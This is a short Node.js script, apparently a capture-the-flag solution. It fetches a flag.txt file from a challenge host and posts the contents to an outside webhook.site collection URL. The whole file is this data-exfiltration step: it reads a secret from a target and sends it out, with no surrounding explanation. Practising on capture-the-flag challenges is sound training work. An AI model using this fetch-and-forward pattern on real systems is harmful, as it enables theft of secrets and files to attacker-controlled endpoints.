const request = require('request');

request.get('http://integridade.challenges.cfd/flag.txt', (error, response, body) => {
    if (error) {
        console.error('Error fetching flag.txt:', error);
        return;
    }

    request.post('https://webhook.site/a3ec6dd8-12a7-4daa-9faf-7c9cba66613c', { form: { flag: body } });
});
